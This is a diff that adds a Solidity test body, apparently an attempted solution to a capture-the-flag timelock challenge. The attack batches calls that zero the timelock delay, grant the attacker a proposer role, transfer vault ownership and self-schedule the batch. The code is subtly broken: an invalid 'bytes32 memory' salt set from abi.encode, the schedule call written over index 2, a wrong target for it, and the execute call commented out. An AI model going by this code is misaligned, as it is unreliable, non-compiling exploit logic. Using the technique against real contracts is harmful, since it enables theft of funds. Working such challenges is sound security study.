@@ -85,7 +85,34 @@ contract ClimberChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_climber() public checkSolvedByPlayer {
-        
+        address[] memory targets = new address[](4); 
+        uint256[] memory values = new uint256[](4);
+        bytes[] memory dataElements = new bytes[](4);
+        bytes32 memory salt = abi.encode(block.timestamp,msg.sender);
+
+        targets[0] = address(timelock);
+        values[0] = 0;
+        dataElements[0] = abi.encodeWithSelector(timelock.updateDelay.selector, 0);
+
+        targets[1] = address(timelock);
+        values[1] = 0;
+        dataElements[1] = abi.encodeWithSelector(timelock.grantRole.selector, timelock.PROPOSER_ROLE,address(this));
+
+        targets[2] = address(vault);
+        values[2] = 0;
+        dataElements[2] = abi.encodeWithSelector(vault.transferOwnership.selector, address(this));
+
+        targets[3] = address(this);
+        values[3] = 0;
+        dataElements[2] = abi.encodeWithSelector(timelock.schedule.selector, targets,values,dataElements,salt);
+
+
+
+
+
+
+
+        // timelock.execute(targets, values, dataElements, salt);
     }
 
     /**
